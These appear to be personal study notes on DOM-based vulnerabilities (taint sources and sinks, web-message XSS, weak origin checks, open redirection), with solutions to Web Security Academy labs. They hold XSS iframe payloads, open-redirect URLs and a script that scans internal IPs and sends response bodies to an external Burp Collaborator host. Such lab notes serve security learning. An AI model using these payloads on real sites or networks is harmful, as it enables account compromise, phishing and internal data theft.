The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties.
## Taint Flow
It is important to first familiarize yourself with the basics of taint flow between sources and sinks.
#### Sources
A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string), and web messages.
#### Sinks
A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

The most common source is the URL, which is typically accessed with the `location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. Consider the following code:

```HTML
goto = location.hash.slice(1) 
if (goto.startsWith('https:')) {
location = goto; 
}
```

This is vulnerable to DOM-based open redirection because the `location.hash` source is handled in an unsafe way. If the URL contains a hash fragment that starts with `https:`, this code extracts the value of the `location.hash` property and sets it as the `location` property of the `window`. An attacker could exploit this vulnerability by constructing the following URL:

```
https://www.innocent-website.com/example#https://www.evil-user.net
```

When a victim visits this URL, the JavaScript sets the value of the `location` property to `https://www.evil-user.net`.
## How to construct an attack using web messages as the source
Consider the following code:
```html
<script> 
window.addEventListener('message', function(e) {   
eval(e.data); 
}); 
</script>
```
This is vulnerable because an attacker could inject a JavaScript payload by constructing the following `iframe`:
```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```
As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into a sink, in this case, the `eval()` function.
### Lab: DOM XSS using web messages
![[file-20250803160631658.png]]
The function `addEventListener()` that listen for message for `ads`. 
![[file-20250803161256007.png]]
```html
<iframe src="https://0a740024031f55b780bbf34f00db0022.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
Store and deliver the exploit. 
> When the `iframe` loads, the `postMessage()` method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the `div` with the ID `ads`. However, in this case it inserts our `img` tag, which contains an invalid `src` attribute. This throws an error, which causes the `onerror` event handler to execute our payload.

### Lab: DOM XSS using web messages and a JavaScript URL
![[file-20250803162257857.png]]
```html
<iframe src="https://0acf00f0042b4965809bb289003e000f.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
>This script sends a web message containing an arbitrary JavaScript payload, along with the string `"http:"`. The second argument specifies that any `targetOrigin` is allowed for the web message.

>When the `iframe` loads, the `postMessage()` method sends the JavaScript payload to the main page. The event listener spots the `"http:"` string and proceeds to send the payload to the `location.href` sink, where the `print()` function is called.

## Origin Verification
Even if an event listener does include some form of origin verification, this verification step can sometimes be fundamentally flawed. For example, consider the following code:

```html
window.addEventListener('message', function(e) {
	if (e.origin.indexOf('normal-website.com') > -1) { 
		eval(e.data); 
	}
});
```

The `indexOf` method is used to try and verify that the origin of the incoming message is the `normal-website.com` domain. However, in practice, it only checks whether the string `"normal-website.com"` is contained anywhere in the origin URL. As a result, an attacker could easily bypass this verification step if the origin of their malicious message was **`http://www.normal-website.com.evil.net`**, for example.
The same flaw also applies to verification checks that rely on the `startsWith()` or `endsWith()` methods. For example, the following event listener would regard the origin **`http://www.malicious-websitenormal-website.com`** as safe:
```html
window.addEventListener('message', function(e) { 
	if (e.origin.endsWith('normal-website.com')) { 
		eval(e.data); 
	} 
});
```
### Lab: DOM XSS using web messages and `JSON.parse`
![[file-20250803170000155.png]]
```html
<iframe src=https://0ae500df03702317806f717400a500f6.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
Escaping the special characters in JSON.
```JSON
{
\"type\":\"load-channel\",
\"url\":\"javascript:print()\"
}
```
When the `iframe` we constructed loads, the `postMessage()` method sends a web message to the home page with the type `load-channel`. The event listener receives the message and parses it using `JSON.parse()` before sending it to the `switch`.

The `switch` triggers the `load-channel` case, which assigns the `url` property of the message to the `src` attribute of the `ACMEplayer.element` `iframe`. However, in this case, the `url` property of the message actually contains our JavaScript payload.

As the second argument specifies that any `targetOrigin` is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the `src` of the `ACMEplayer.element` `iframe`. The `print()` function is called when the victim loads the page in their browser.
## DOM-based Open redirection
DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation. For example, the following code is vulnerable due to the unsafe way it handles the `location.hash` property:

```js
let url = /https?:\/\/.+/.exec(location.hash); 
if (url) {   
	location = url[0]; 
}
```

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.
### What is the impact of DOM-based open redirection?
This behavior can be leveraged to facilitate phishing attacks against users of the website, for example. The ability to use an authentic application URL targeting the correct domain and with a valid TLS certificate (if TLS is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack. An attacker could construct a URL with the `javascript:` pseudo-protocol to execute arbitrary code when the URL is processed by the browser.
### Lab: DOM-based Open Redirection
The `url` parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog" link takes the user. To solve the lab, construct and visit the following URL, remembering to change the URL to contain your lab ID and your exploit server ID:
```
https://0a6d001104fc8f7e819cb616008300b1.web-security-academy.net/post?postId=4&url=https://exploit-0a2c00d004ae8fda812bb55e01890065.exploit-server.net/
```
## Important Payloads
### Web messages:
If the sender is not verified/checked.
```html
<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

```html
<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
### IP brute forcing (internal IP)
```html
<script>
const BURP_HOST = '5qwkaad5lhyov1p42rppclhwnntdh2.oastify.com'
for (let i = 0; i < 256; i++) {
  fetch(`http://192.168.0.${i}:8080`)
  .then(res => { res.text().then(text => {
    fetch(`http://${BURP_HOST}?q=${i}&body=${encodeURIComponent(text)}`)
  })})
}
</script>
```